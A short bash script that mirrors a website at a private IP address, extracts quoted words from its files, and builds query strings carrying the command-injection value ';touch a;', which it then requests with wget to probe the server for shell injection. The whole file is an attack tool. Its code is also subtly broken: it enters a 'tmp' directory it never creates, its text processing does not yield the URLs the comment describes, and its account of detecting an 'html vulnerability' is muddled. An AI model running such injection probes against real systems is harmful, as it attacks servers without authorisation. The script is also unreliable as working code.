#!/bin/bash
# This script will download the entire website at 192.168.1.15. The script will then recursively search those downloaded files and print the full URL
# and the text within quotes, within the downloaded files. The script will remove the trailing text from the URLs and will replace :" with ? and " 
# with ;touch a;. The entire line will then be written to output.txt. The script will then wget from this file which includes the URLs argument of
# ;touch a;. If an html vulnerability is detected then the website will produce the filename a.
cd tmp
wget --recursive --no-clobber --domains 192.168.1.15 --no-parent 192.168.1.15
grep -rEo '"[a-zA-Z]+"' . | cut -c 3- | sed 's/:"/?/g' | sed 's/"/=;touch a;/g' >> ../output.txt
cd ..
mkdir tmp2
cd tmp2
wget -i ../output.txt
